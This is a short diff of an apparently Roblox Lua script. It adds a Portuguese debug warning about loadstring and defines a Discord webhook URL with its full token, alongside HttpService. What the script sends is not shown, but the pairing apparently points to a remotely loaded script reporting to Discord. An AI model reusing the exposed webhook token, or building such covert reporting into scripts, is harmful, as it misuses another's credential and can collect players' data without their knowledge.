@@ -1,3 +1,4 @@
+warn("LOADSTRING CHEGOU AQUI")
 local W="https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
 local H=game:GetService("HttpService")
 local T=game:GetService("TweenService")
